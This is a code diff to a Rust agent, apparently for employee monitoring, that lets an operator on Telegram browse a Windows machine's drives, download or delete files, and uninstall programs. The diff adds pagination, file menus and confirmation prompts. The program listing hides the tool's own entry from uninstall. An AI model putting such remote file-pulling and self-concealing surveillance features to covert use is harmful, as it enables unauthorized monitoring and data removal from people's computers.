@@ -34,6 +34,7 @@ const LIVE_JPEG_WIDTH: u32 = 1920;
 const LIVE_JPEG_QUALITY: u8 = 90;
 const SHOT_DEBOUNCE: Duration = Duration::from_secs(8);
 const SLOT_TTL: Duration = Duration::from_secs(15 * 60);
+const PAGE_SIZE: usize = 8;
 
 static SLOT_SEQ: AtomicU32 = AtomicU32::new(1);
 static REQ_SEQ: AtomicU64 = AtomicU64::new(1);
@@ -153,6 +154,10 @@ enum SlotKind {
     AskUninstall(String),
     ConfirmDel(PathBuf),
     ConfirmUninstall(String),
+    PageDir { path: PathBuf, offset: usize },
+    PagePrograms { offset: usize },
+    FileMenu(PathBuf),
+    Cancel { op: String, path: String },
 }
 
 struct IpcWait {
@@ -325,13 +330,22 @@ fn poll_loop(cfg: AppConfig, client: TelegramClient, tx: Sender<AdminCmd>, jobs:
                             if let Some(name) = cmd.target_name() {
                                 if commands::names_match(name, &cfg.employee_name, &windows_user())
                                 {
-                                    if last_fs.elapsed() >= FS_DEBOUNCE {
+                                    let heavy = matches!(
+                                        cmd,
+                                        AdminCommand::Get { .. }
+                                            | AdminCommand::Copy { .. }
+                                            | AdminCommand::Del { .. }
+                                            | AdminCommand::Uninstall { .. }
+                                    );
+                                    if heavy && last_fs.elapsed() < FS_DEBOUNCE {
+                                        state.processed = state.processed.max(u.update_id);
+                                        continue;
+                                    }
+                                    if heavy {
                                         last_fs = Instant::now();
-                                        if send_fs_job(&jobs, fs_ctx(&cfg, &u.chat_id), cmd)
-                                            .is_err()
-                                        {
-                                            return;
-                                        }
+                                    }
+                                    if send_fs_job(&jobs, fs_ctx(&cfg, &u.chat_id), cmd).is_err() {
+                                        return;
                                     }
                                 }
                             }
@@ -590,7 +604,7 @@ fn do_files(client: &TelegramClient, ctx: &FsCtx, path: Option<&str>) {
     match path {
         None | Some("") => {
             let drives = admin_fs::list_drives();
-            let extra = admin_fs::format_drives(&drives);
+            let extra = "Tap a drive to open it.";
             let mut rows: Vec<Vec<InlineBtn>> = Vec::new();
             let mut row = Vec::new();
             for d in &drives {
@@ -608,17 +622,28 @@ fn do_files(client: &TelegramClient, ctx: &FsCtx, path: Option<&str>) {
             } else {
                 Some(inline_markup(&rows))
             };
-            send_log_markup(client, ctx, "list", "(drives)", "ok", &extra, mk.as_deref());
+            send_log_markup(client, ctx, "list", "(drives)", "ok", extra, mk.as_deref());
         }
-        Some(p) => send_listing(client, ctx, Path::new(p)),
+        Some(p) => send_listing(client, ctx, &admin_fs::normalize_admin_path(p), 0),
     }
 }
 
-fn send_listing(client: &TelegramClient, ctx: &FsCtx, path: &Path) {
+fn send_listing(client: &TelegramClient, ctx: &FsCtx, path: &Path, offset: usize) {
     match admin_fs::list_dir(path) {
         Ok(list) => {
-            let extra = admin_fs::format_listing(&list);
-            let rows = listing_buttons(&list, &ctx.tag);
+            let total = list.dirs.len() + list.files.len();
+            let page = offset / PAGE_SIZE + 1;
+            let pages = (total.max(1) + PAGE_SIZE - 1) / PAGE_SIZE;
+            let trunc = if list.truncated {
+                "\n(list truncated)"
+            } else {
+                ""
+            };
+            let extra = format!(
+                "Path: {}\nTap a folder to open, or a file for Get / Delete.\nPage {page} / {pages} ({total} items){trunc}",
+                list.path
+            );
+            let rows = listing_buttons(&list, &ctx.tag, offset);
             let mk = if rows.is_empty() {
                 None
             } else {
@@ -636,40 +661,77 @@ fn send_listing(client: &TelegramClient, ctx: &FsCtx, path: &Path) {
     }
 }
 
-fn listing_buttons(list: &admin_fs::DirListing, tag: &str) -> Vec<Vec<InlineBtn>> {
+fn listing_buttons(list: &admin_fs::DirListing, tag: &str, offset: usize) -> Vec<Vec<InlineBtn>> {
     let mut rows = Vec::new();
+    let mut nav = Vec::new();
     if let Some(p) = &list.parent {
         let id = alloc_slot(SlotKind::Open(p.clone()));
-        rows.push(vec![btn("Parent", &cb_data('o', tag, id))]);
+        nav.push(btn("Parent", &cb_data('o', tag, id)));
     } else {
         let id = alloc_slot(SlotKind::Open(PathBuf::new()));
-        rows.push(vec![btn("Drives", &cb_data('o', tag, id))]);
+        nav.push(btn("Drives", &cb_data('o', tag, id)));
     }
+    let total = list.dirs.len() + list.files.len();
+    if offset >= PAGE_SIZE {
+        let id = alloc_slot(SlotKind::PageDir {
+            path: PathBuf::from(&list.path),
+            offset: offset - PAGE_SIZE,
+        });
+        nav.push(btn("Prev", &cb_data('m', tag, id)));
+    }
+    if offset + PAGE_SIZE < total {
+        let id = alloc_slot(SlotKind::PageDir {
+            path: PathBuf::from(&list.path),
+            offset: offset + PAGE_SIZE,
+        });
+        nav.push(btn("Next", &cb_data('m', tag, id)));
+    }
+    rows.push(nav);
     let cur = PathBuf::from(&list.path);
     if admin_fs::refuse_delete(&cur).is_none() {
         let id = alloc_slot(SlotKind::AskDel(cur));
         rows.push(vec![btn("Delete this folder", &cb_data('d', tag, id))]);
     }
-    for d in list.dirs.iter().take(16) {
+    let start = offset.min(total);
+    let mut i = 0usize;
+    for d in &list.dirs {
+        if i < start {
+            i += 1;
+            continue;
+        }
+        if i >= start + PAGE_SIZE {
+            break;
+        }
+        i += 1;
         let id = alloc_slot(SlotKind::Open(d.clone()));
         rows.push(vec![btn(
-            &format!("Open {}", trunc_name(d)),
+            &format!("[dir] {}", trunc_name(d)),
             &cb_data('o', tag, id),
         )]);
     }
-    for (f, _) in list.files.iter().take(10) {
-        let gid = alloc_slot(SlotKind::Get(f.clone()));
-        let did = alloc_slot(SlotKind::AskDel(f.clone()));
-        rows.push(vec![
-            btn(&format!("Get {}", trunc_name(f)), &cb_data('g', tag, gid)),
-            btn("Del", &cb_data('d', tag, did)),
-        ]);
+    for (f, sz) in &list.files {
+        if i < start {
+            i += 1;
+            continue;
+        }
+        if i >= start + PAGE_SIZE {
+            break;
+        }
+        i += 1;
+        let id = alloc_slot(SlotKind::FileMenu(f.clone()));
+        rows.push(vec![btn(
+            &format!("[file] {} ({})", trunc_name(f), admin_fs::format_size(*sz)),
+            &cb_data('f', tag, id),
+        )]);
     }
     rows
 }
 
 fn do_get(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, path: &str) {
-    let p = Path::new(path);
+    let pbuf = admin_fs::normalize_admin_path(path);
+    let path = pbuf.to_string_lossy().into_owned();
+    let p = pbuf.as_path();
+    let path = path.as_str();
     if p.is_dir() {
         send_log(client, ctx, "get", path, "path is a folder — use files");
         return;
@@ -728,7 +790,11 @@ fn do_get(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, path: &str
 }
 
 fn do_copy(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, src: &str, dest: &str) {
-    match admin_fs::copy_any(Path::new(src), Path::new(dest)) {
+    let src_p = admin_fs::normalize_admin_path(src);
+    let dest_p = admin_fs::normalize_admin_path(dest);
+    let src = src_p.to_string_lossy().into_owned();
+    let dest = dest_p.to_string_lossy().into_owned();
+    match admin_fs::copy_any(&src_p, &dest_p) {
         Ok(n) => send_log(
             client,
             ctx,
@@ -746,8 +812,8 @@ fn do_copy(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, src: &str
                     kind: IpcWaitKind::Log,
                 },
                 "copy",
-                src,
-                dest,
+                &src,
+                &dest,
             );
         }
         Err(e) => send_log(
@@ -760,15 +826,56 @@ fn do_copy(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, src: &str
     }
 }
 
+fn do_file_menu(client: &TelegramClient, ctx: &FsCtx, path: &Path) {
+    let name = path
+        .file_name()
+        .map(|s| s.to_string_lossy().into_owned())
+        .unwrap_or_else(|| path.display().to_string());
+    let sz = std::fs::metadata(path)
+        .map(|m| admin_fs::format_size(m.len()))
+        .unwrap_or_else(|_| "?".into());
+    let gid = alloc_slot(SlotKind::Get(path.to_path_buf()));
+    let did = alloc_slot(SlotKind::AskDel(path.to_path_buf()));
+    let rows = vec![
+        vec![
+            btn("Get", &cb_data('g', &ctx.tag, gid)),
+            btn("Delete", &cb_data('d', &ctx.tag, did)),
+        ],
+        vec![btn(
+            "Cancel",
+            &cb_data(
+                'x',
+                &ctx.tag,
+                alloc_slot(SlotKind::Cancel {
+                    op: "file".into(),
+                    path: path.display().to_string(),
+                }),
+            ),
+        )],
+    ];
+    send_log_markup(
+        client,
+        ctx,
+        "file",
+        &path.display().to_string(),
+        "choose",
+        &format!("{name} ({sz})\nTap Get, Delete, or Cancel."),
+        Some(&inline_markup(&rows)),
+    );
+}
+
 fn do_ask_del(client: &TelegramClient, ctx: &FsCtx, path: &str) {
-    let p = Path::new(path);
+    let pbuf = admin_fs::normalize_admin_path(path);
+    let path = pbuf.to_string_lossy().into_owned();
+    let p = pbuf.as_path();
+    let path = path.as_str();
     if let Some(msg) = admin_fs::refuse_delete(p) {
         send_log(client, ctx, "del", path, msg);
         return;
     }
     let id = alloc_slot(SlotKind::ConfirmDel(p.to_path_buf()));
     let rows = vec![vec![
-        btn("Yes", &cb_data('y', &ctx.tag, id)),
+        btn("Yes — delete", &cb_data('y', &ctx.tag, id)),
         btn("No", &cb_data('n', &ctx.tag, id)),
     ]];
     send_log_markup(
@@ -777,18 +884,20 @@ fn do_ask_del(client: &TelegramClient, ctx: &FsCtx, path: &str) {
         "del",
         path,
         "confirm",
-        "Delete this path? Tap Yes or No.",
+        "Delete this path?\nTap Yes or No. This cannot be undone.",
         Some(&inline_markup(&rows)),
     );
 }
 
 fn do_del(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, path: &str) {
-    match admin_fs::delete_any(Path::new(path)) {
+    let pbuf = admin_fs::normalize_admin_path(path);
+    let path = pbuf.to_string_lossy().into_owned();
+    match admin_fs::delete_any(&pbuf) {
         Ok(n) => send_log(
             client,
             ctx,
             "del",
-            path,
+            &path,
             &format!("ok {}", admin_fs::format_size(n)),
         ),
         Err(e) if paths::is_access_denied(&e) => {
@@ -797,31 +906,57 @@ fn do_del(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, path: &str
                 IpcWait {
                     ctx: ctx.clone(),
                     op: "del".into(),
-                    path: path.into(),
+                    path: path.clone(),
                     kind: IpcWaitKind::Log,
                 },
                 "delete",
-                path,
+                &path,
                 "",
             );
         }
-        Err(e) => send_log(client, ctx, "del", path, &format!("{e}")),
+        Err(e) => send_log(client, ctx, "del", &path, &format!("{e}")),
     }
 }
 
 fn do_programs(client: &TelegramClient, ctx: &FsCtx) {
-    let rows = admin_fs::list_programs();
-    let extra = admin_fs::format_programs(&rows);
+    send_programs_page(client, ctx, 0);
+}
+
+fn send_programs_page(client: &TelegramClient, ctx: &FsCtx, offset: usize) {
+    let rows: Vec<_> = admin_fs::list_programs()
+        .into_iter()
+        .filter(|p| !admin_fs::is_ftracker_program(&p.name))
+        .collect();
+    let total = rows.len();
+    let page = offset / PAGE_SIZE + 1;
+    let pages = (total.max(1) + PAGE_SIZE - 1) / PAGE_SIZE;
+    let extra =
+        format!("Tap a program, then Yes to uninstall.\nPage {page} / {pages} ({total} programs)");
     let mut buttons = Vec::new();
-    for p in rows.iter().take(8) {
-        if admin_fs::is_ftracker_program(&p.name) {
-            continue;
-        }
+    let mut nav = Vec::new();
+    if offset >= PAGE_SIZE {
+        let id = alloc_slot(SlotKind::PagePrograms {
+            offset: offset - PAGE_SIZE,
+        });
+        nav.push(btn("Prev", &cb_data('k', &ctx.tag, id)));
+    }
+    if offset + PAGE_SIZE < total {
+        let id = alloc_slot(SlotKind::PagePrograms {
+            offset: offset + PAGE_SIZE,
+        });
+        nav.push(btn("Next", &cb_data('k', &ctx.tag, id)));
+    }
+    if !nav.is_empty() {
+        buttons.push(nav);
+    }
+    for p in rows.iter().skip(offset).take(PAGE_SIZE) {
         let id = alloc_slot(SlotKind::AskUninstall(p.name.clone()));
-        buttons.push(vec![btn(
-            &format!("Uninstall {}", trunc_str(&p.name, 28)),
-            &cb_data('u', &ctx.tag, id),
-        )]);
+        let label = if p.publisher.is_empty() {
+            trunc_str(&p.name, 40)
+        } else {
+            trunc_str(&format!("{} ({})", p.name, p.publisher), 40)
+        };
+        buttons.push(vec![btn(&label, &cb_data('u', &ctx.tag, id))]);
     }
     let mk = if buttons.is_empty() {
         None
@@ -833,7 +968,7 @@ fn do_programs(client: &TelegramClient, ctx: &FsCtx) {
         ctx,
         "programs",
         "(installed)",
-        &format!("ok {}", rows.len()),
+        &format!("ok {total}"),
         &extra,
         mk.as_deref(),
     );
@@ -851,10 +986,15 @@ fn do_ask_uninstall(client: &TelegramClient, ctx: &FsCtx, display: &str) {
         return;
     }
     match admin_fs::find_program(display) {
-        Some(p) => {
+        Ok(p) => {
             let id = alloc_slot(SlotKind::ConfirmUninstall(p.name.clone()));
+            let pub_line = if p.publisher.is_empty() {
+                String::new()
+            } else {
+                format!("\nPublisher: {}", p.publisher)
+            };
             let rows = vec![vec![
-                btn("Yes", &cb_data('y', &ctx.tag, id)),
+                btn("Yes — uninstall", &cb_data('y', &ctx.tag, id)),
                 btn("No", &cb_data('n', &ctx.tag, id)),
             ]];
             send_log_markup(
@@ -863,11 +1003,13 @@ fn do_ask_uninstall(client: &TelegramClient, ctx: &FsCtx, display: &str) {
                 "uninstall",
                 &p.name,
                 "confirm",
-                "Uninstall this program? Tap Yes or No.",
+                &format!(
+                    "Uninstall this program?{pub_line}\nTap Yes or No. This cannot be undone."
+                ),
                 Some(&inline_markup(&rows)),
             );
         }
-        None => send_log(client, ctx, "uninstall", display, "program not found"),
+        Err(e) => send_log(client, ctx, "uninstall", display, e),
     }
 }
 
@@ -906,7 +1048,13 @@ fn do_callback(
     let Some((op, id)) = parse_cb(data, &ctx.tag) else {
         return;
     };
-    let Some(kind) = take_slot(id) else {
+    let consume = matches!(op, 'y' | 'n' | 'g' | 'x');
+    let kind = if consume {
+        take_slot(id)
+    } else {
+        peek_slot(id)
+    };
+    let Some(kind) = kind else {
         let _ = client.answer_callback(query_id, "expired");
         return;
     };
@@ -916,13 +1064,24 @@ fn do_callback(
             if p.as_os_str().is_empty() {
                 do_files(client, ctx, None);
             } else {
-                send_listing(client, ctx, &p);
+                send_listing(client, ctx, &p, 0);
             }
         }
+        ('m', SlotKind::PageDir { path, offset }) => {
+            send_listing(client, ctx, &path, offset);
+        }
+        ('k', SlotKind::PagePrograms { offset }) => {
+            send_programs_page(client, ctx, offset);
+        }
+        ('f', SlotKind::FileMenu(p)) => do_file_menu(client, ctx, &p),
         ('g', SlotKind::Get(p)) => do_get(client, ipc, ctx, &p.display().to_string()),
         ('d', SlotKind::AskDel(p)) => do_ask_del(client, ctx, &p.display().to_string()),
         ('u', SlotKind::AskUninstall(name)) => do_ask_uninstall(client, ctx, &name),
-        ('y', SlotKind::ConfirmDel(p)) => do_del(client, ipc, ctx, &p.display().to_string()),
+        ('y', SlotKind::ConfirmDel(p)) => {
+            if !p.as_os_str().is_empty() {
+                do_del(client, ipc, ctx, &p.display().to_string());
+            }
+        }
         ('y', SlotKind::ConfirmUninstall(name)) => do_uninstall(client, ipc, ctx, &name),
         ('n', SlotKind::ConfirmDel(p)) => {
             send_log(client, ctx, "del", &p.display().to_string(), "cancelled")
@@ -930,6 +1089,7 @@ fn do_callback(
         ('n', SlotKind::ConfirmUninstall(name)) => {
             send_log(client, ctx, "uninstall", &name, "cancelled")
         }
+        ('x', SlotKind::Cancel { op, path }) => send_log(client, ctx, &op, &path, "cancelled"),
         _ => {}
     }
 }
@@ -1005,6 +1165,10 @@ fn alloc_slot(kind: SlotKind) -> u32 {
 
 fn take_slot(id: u32) -> Option<SlotKind> {
     slots().lock().ok()?.remove(&id).map(|s| s.kind)
+}
+
+fn peek_slot(id: u32) -> Option<SlotKind> {
+    slots().lock().ok()?.get(&id).map(|s| s.kind.clone())
 }
 
 fn prune_slots() {
